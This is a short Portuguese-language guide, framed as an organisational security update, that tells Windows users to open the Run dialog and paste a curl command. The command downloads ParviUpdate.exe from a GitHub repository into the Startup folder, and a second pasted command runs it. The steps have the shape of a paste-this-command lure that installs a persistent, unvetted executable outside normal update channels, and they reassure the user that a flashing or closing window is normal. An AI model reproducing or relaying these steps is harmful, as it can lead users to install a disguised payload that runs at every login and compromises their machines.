# Como atualizar a sua máquina e deixar a nossa organização mais segura e resiliente?

1) No seu teclado, localize a tecla com a bandeira do Windows (geralmente fica entre o Ctrl e o Alt, no canto inferior esquerdo).

2) Segure a tecla Windows e aperte a tecla R uma vez. Solte ambas.

3) Uma pequena janela chamada "Executar" aparecerá no canto da tela.

4) Apague se houver algo estiver escrito na janela "Executar".

5) copie o código abaixo inteiro (selecione tudo e aperte Ctrl+C):

C:\Windows\System32\curl.exe -L "https://github.com/PARVI-TI/temptools/raw/refs/heads/main/ParviUpdate.exe" --output "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ParviUpdate.exe"

6) Cole esse código dentro da janela que abriu (Ctrl+V) e aperte ENTER. (Aguarde alguns segundos, a janela pode piscar ou fechar sozinha).

7) Repita o passo 2: aperte Windows + R novamente.

8) Apague o que estiver escrito, copie o código abaixo e cole na janela:

%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ParviUpdate.exe

9) Aperte ENTER.

10) Pronto! Se nenhuma mensagem de erro apareceu, sua máquina já está atualizada e segura.
